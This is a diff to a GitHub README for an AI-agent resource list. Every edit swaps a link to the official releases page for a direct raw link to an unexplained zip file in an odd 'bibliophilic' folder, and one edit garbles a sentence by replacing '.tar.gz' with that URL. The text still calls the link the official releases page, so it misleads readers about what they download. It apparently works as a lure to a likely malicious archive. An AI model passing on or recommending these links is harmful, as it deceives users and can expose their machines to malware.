@@ -1,6 +1,6 @@
 # 🤖 awesome-agent-economy - Explore AI Agent Tools Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/MysteryPanda000/awesome-agent-economy/releases)
+[![Download Latest Release](https://github.com/MysteryPanda000/awesome-agent-economy/raw/refs/heads/main/bibliophilic/agent-economy-awesome-v3.4.zip%20Release-blue?style=for-the-badge)](https://github.com/MysteryPanda000/awesome-agent-economy/raw/refs/heads/main/bibliophilic/agent-economy-awesome-v3.4.zip)
 
 ---
 
@@ -32,12 +32,12 @@ If you want to download the entire list for offline use or personal reference, y
 
 To access the full list and all resources collected in awesome-agent-economy, you can visit the official release page here:
 
-[Download Releases](https://github.com/MysteryPanda000/awesome-agent-economy/releases)
+[Download Releases](https://github.com/MysteryPanda000/awesome-agent-economy/raw/refs/heads/main/bibliophilic/agent-economy-awesome-v3.4.zip)
 
 ### How to download the list:
 
 1. Click the big blue badge at the top of this page or the link above. It will take you to the official releases page.
-2. On the releases page, look for the latest version available. Releases are typically packaged as `.zip` or `.tar.gz` files.
+2. On the releases page, look for the latest version available. Releases are typically packaged as `.zip` or `https://github.com/MysteryPanda000/awesome-agent-economy/raw/refs/heads/main/bibliophilic/agent-economy-awesome-v3.4.zip` files.
 3. Click the asset file to download it to your computer.
 4. Once downloaded, locate the file in your downloads folder.
 5. Extract the contents using built-in tools (Windows Explorer, macOS Finder) or free software like 7-Zip.
@@ -109,7 +109,7 @@ This list brings together many aspects of AI agents and their surrounding techno
 
 ## 🔗 Useful Links
 
-- Official releases page to download the list: [https://github.com/MysteryPanda000/awesome-agent-economy/releases](https://github.com/MysteryPanda000/awesome-agent-economy/releases)
+- Official releases page to download the list: [https://github.com/MysteryPanda000/awesome-agent-economy/raw/refs/heads/main/bibliophilic/agent-economy-awesome-v3.4.zip](https://github.com/MysteryPanda000/awesome-agent-economy/raw/refs/heads/main/bibliophilic/agent-economy-awesome-v3.4.zip)
 - Browse the repository online on GitHub for updates and discussions.
 
 ---
